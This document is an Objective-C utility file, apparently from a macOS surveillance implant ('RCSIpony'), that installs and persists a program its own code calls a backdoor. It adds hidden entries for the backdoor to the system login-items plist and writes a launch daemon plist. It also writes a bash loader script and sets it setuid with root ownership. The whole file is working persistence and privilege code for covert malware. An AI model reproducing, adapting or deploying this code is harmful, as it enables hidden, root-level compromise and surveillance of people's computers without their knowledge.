/*
 * RCSIpony - Utils and stuff
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 08/09/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <fcntl.h>

#import "RCSIUtils.h"
#import "RCSICommon.h"

//#define DEBUG

@implementation RCSIUtils

- (id)initWithBackdoorPath: (NSString *)aBackdoorPath
                  kextPath: (NSString *)aKextPath
              SLIPlistPath: (NSString *)aSLIPlistPath
             serviceLoader: (NSString *)aServiceLoaderPath
                  execFlag: (NSString *)anExecFlag
{
  self = [super init];
  
  if (self != nil)
    {
      mBackdoorPath       = [aBackdoorPath copy];
      mKextPath           = [aKextPath copy];
      mSLIPlistPath       = [aSLIPlistPath copy];
      mServiceLoaderPath  = [aServiceLoaderPath copy];
      mExecFlag           = [anExecFlag copy];  
    }
  return self;
}

- (void)dealloc
{
  [mBackdoorPath release];
  [mKextPath release];
  [mSLIPlistPath release];
  [mServiceLoaderPath release];
  [mExecFlag release];
  
  [super dealloc];
}

- (void)executeTask: (NSString *)anAppPath
      withArguments: (NSArray *)arguments
       waitUntilEnd: (BOOL)waitForExecution
{
#ifdef DEBUG
  NSLog(@"[executeTaskWithArgs] Executing %@", anAppPath);
#endif
#if 0
  NSTask *task = [[NSTask alloc] init];
  [task setLaunchPath: anAppPath];
  
  if (arguments != nil)
    [task setArguments: arguments];
  
  NSPipe *pipe = [NSPipe pipe];
  [task setStandardOutput: pipe];
  
  // NSFileHandle *file = [pipe fileHandleForReading];
  [task launch];
  
  if (waitForExecution == YES)
    [task waitUntilExit];
#endif
  /*
   NSData *data = [file readDataToEndOfFile];
   NSString *string = [[NSString alloc] initWithData:data
   encoding:NSUTF8StringEncoding];
   RCSMDebug(1, @"[executeTaskWithArgs] %@", string);
   */
}

- (BOOL)addBackdoorToSLIPlist
{  
  NSMutableDictionary *dicts = [self openSLIPlist];
  NSArray *keys = [dicts allKeys];
  
  if (dicts)
    {
    for (NSString *key in keys)
      {
      if ([key isEqualToString: @"AutoLaunchedApplicationDictionary"])
        {
          NSMutableArray *value = (NSMutableArray *)[dicts objectForKey: key];
        
        if (value != nil)
          {
#ifdef DEBUG
            NSLog(@"%@", value);
            NSLog(@"%@", [value class]);
#endif
            NSMutableDictionary *entry = [NSMutableDictionary new];
            [entry setObject: [NSNumber numberWithBool: TRUE] forKey: @"Hide"];
            [entry setObject: [self mBackdoorPath] forKey: @"Path"];
          
            [value addObject: entry];
          }
        }
      }
    }
  
  return [self saveSLIPlist: dicts atPath: [[[NSBundle mainBundle] bundlePath]
                                            stringByAppendingPathComponent:
                                            @"com.apple.SystemLoginItems.plist"]];
}

- (BOOL)removeBackdoorFromSLIPlist
{
  //
  // For now we just move back the backup that we made previously
  // The best way would be just by removing our own entry from the most
  // up to date SLI plist /Library/Preferences/com.apple.SystemLoginItems.plist
  //
  if ([[NSFileManager defaultManager] removeItemAtPath:mSLIPlistPath
                                                 error:nil] == YES)
    return [[NSFileManager defaultManager] copyItemAtPath:[[[NSBundle mainBundle] bundlePath]
                                                           stringByAppendingFormat:@"com.apple.SystemLoginItems.plist_bak"]
                                                   toPath:mSLIPlistPath error:nil];
  else
    return NO;
}

- (BOOL)searchSLIPlistForKey: (NSString *)aKey;
{  
  NSMutableDictionary *dicts = [self openSLIPlist];
  NSArray *keys = [dicts allKeys];
  
  if (dicts)
    {
      for (NSString *key in keys)
        {
          if ([key isEqualToString: @"AutoLaunchedApplicationDictionary"])
            {
              NSString *value = (NSString *)[dicts valueForKey: key];
              id searchResult = [value valueForKey: @"Path"];
            
              NSEnumerator *enumerator = [searchResult objectEnumerator];
              id searchResObject;
            
              while ((searchResObject = [enumerator nextObject]) != nil )
                {
                  if ([searchResObject isEqualToString: aKey])
                  return YES;
                }
            }
        }
    }
  
  return NO;
}

- (BOOL)saveSLIPlist: (id)anObject atPath: (NSString *)aPath
{
#ifdef DEBUG
  NSLog(@"saveSLIPlist: saving plist file %@", aPath);
#endif
  
  BOOL success = [anObject writeToFile: aPath atomically: NO];
  
  if (success == NO)
    {
#ifdef DEBUG
      NSLog(@"saveSLIPlist: An error occured while saving the plist file");
#endif
      return NO;
    }
  else
    {
#ifdef DEBUG
      NSLog(@"saveSLIPlist: Plist file saved: correctly");
#endif
      return YES;
    }
}

- (BOOL)createSLIPlistWithBackdoor
{
  NSMutableDictionary *rootObj = [NSMutableDictionary dictionaryWithCapacity:1];
  NSDictionary *innerDict;
  NSMutableArray *innerArray = [NSMutableArray new];
  NSString *appKey = @"AutoLaunchedApplicationDictionary";
  
  innerDict = [NSDictionary dictionaryWithObjects:
               [NSArray arrayWithObjects: @"1", [self mBackdoorPath], nil, nil]
                                          forKeys: [NSArray arrayWithObjects:
                                                    @"Hide", @"Path", nil]];
  [innerArray addObject: innerDict];
  [rootObj setObject: innerArray forKey: appKey];
  
  NSString *err;
  NSData *binData = [NSPropertyListSerialization
                     dataFromPropertyList: rootObj
                     format: NSPropertyListBinaryFormat_v1_0
                     errorDescription: &err];
  
  if (binData)
    {
      return [self saveSLIPlist: binData
                         atPath: [self mSLIPlistPath]];
    }
  else
    {
#ifdef DEBUG
      NSLog(@"[createSLIPlist] An error occurred");
#endif
    
      [err release];
    }
  
  return NO;
}

- (BOOL)createLaunchAgentPlist: (NSString *)aLabel
{
  NSMutableDictionary *rootObj = [NSMutableDictionary dictionaryWithCapacity:1];
  NSDictionary *innerDict;
  
  NSString *ourPlist = BACKDOOR_DAEMON_PLIST;
  
  //NSString *backdoorPath = [NSString stringWithFormat: @"%@/%@", mBackdoorPath, gBackdoorName];
  
  innerDict = [[NSDictionary alloc] initWithObjectsAndKeys:
               aLabel, @"Label",
               [NSNumber numberWithBool: FALSE], @"OnDemand",
               [NSArray arrayWithObjects: mServiceLoaderPath, nil], @"ProgramArguments", nil];
  
  [rootObj addEntriesFromDictionary: innerDict];
  
  return [self saveSLIPlist: rootObj
                     atPath: ourPlist];
}

- (BOOL)createBackdoorLoader
{
  NSString *backdoorExec = [[NSBundle mainBundle] executablePath];
  NSString *backdoorPath = [[NSBundle mainBundle] bundlePath];
  NSString *myData = [NSString stringWithFormat:
                      @"#!/bin/bash\n cd %@\n %@\n", backdoorPath, backdoorExec];
#ifdef DEBUG
  NSLog(@"createBackdoorLoader: write down loader file [%@]", mServiceLoaderPath);
#endif
  
  [myData writeToFile: mServiceLoaderPath
           atomically: NO
             encoding: NSASCIIStringEncoding
                error: nil];
  
  return [self makeSuidBinary: mServiceLoaderPath];
  
  return YES;
}

- (BOOL)isBackdoorPresentInSLI: (NSString *)aKey
{
  return [self searchSLIPlistForKey: aKey];
}

- (id)openSLIPlist
{
  NSData *binData = [NSData dataWithContentsOfFile: mSLIPlistPath];
  NSString *error;
  
  if (!binData)
    {
#ifdef DEBUG
      NSLog(@"[openSLIPlist] Error while opening %@", mSLIPlistPath);
#endif
    
      return 0;
    }
  
  NSPropertyListFormat format;
  NSMutableDictionary *dicts = (NSMutableDictionary *)
  [NSPropertyListSerialization propertyListFromData: binData
                                   mutabilityOption: NSPropertyListMutableContainersAndLeaves
                                             format: &format
                                   errorDescription: &error];
  
  if (dicts)
    return dicts;
  else
    return 0;
}

- (BOOL)makeSuidBinary: (NSString *)aBinary
{
  BOOL success;
  
  //
  // Forcing suid permission on start, just to be sure
  //
  u_long permissions = (S_ISUID | S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
  NSValue *permission = [NSNumber numberWithUnsignedLong:permissions];
  NSValue *owner = [NSNumber numberWithInt:0];
  
  success = [[NSFileManager defaultManager] changeFileAttributes:
             [NSDictionary dictionaryWithObjectsAndKeys: permission, NSFilePosixPermissions, owner, NSFileOwnerAccountID, nil] 
                                                          atPath: aBinary];  
  
  return success;  
}

- (BOOL)dropExecFlag
{
  BOOL success;
  
  //
  // Create the empty existence flag file
  //
  success = [@"" writeToFile: [self mExecFlag]
                  atomically: NO
                    encoding: NSUnicodeStringEncoding
                       error: nil];
  
  if (success == YES)
    {
#ifdef DEBUG
      NSLog(@"Existence flag created successfully"); 
#endif
    
      return YES;
    }
  else
    {
#ifdef DEBUG
      NSLog(@"Error while creating the existence flag");
#endif
    
      return NO;
    }
}

- (NSString *)mBackdoorPath
{
  return mBackdoorPath;
}

- (void)setBackdoorPath: (NSString *)aValue
{
  if (aValue != mBackdoorPath)
    {
      [mBackdoorPath release];
      mBackdoorPath = [aValue retain];
    }
}

- (NSString *)mKextPath
{
  return mKextPath;
}

- (void)setKextPath: (NSString *)aValue
{
  if (aValue != mKextPath)
    {
      [mKextPath release];
      mKextPath = [aValue retain];
    }
}

- (NSString *)mSLIPlistPath
{
  return mSLIPlistPath;
}

- (void)setSLIPlistPath: (NSString *)aValue
{
  if (aValue != mSLIPlistPath)
    {
      [mSLIPlistPath release];
      mSLIPlistPath = [aValue retain];
    }
}

- (NSString *)mServiceLoaderPath
{
  return mServiceLoaderPath;
}

- (void)setServiceLoaderPath: (NSString *)aValue
{
  if (aValue != mServiceLoaderPath)
    {
      [mServiceLoaderPath release];
      mServiceLoaderPath = [aValue retain];
    }
}

- (NSString *)mExecFlag
{
  return mExecFlag;
}

- (void)setExecFlag: (NSString *)aValue
{
  if (mExecFlag != aValue)
    {
      [mExecFlag release];
      mExecFlag = [aValue retain];
    }
}

@end
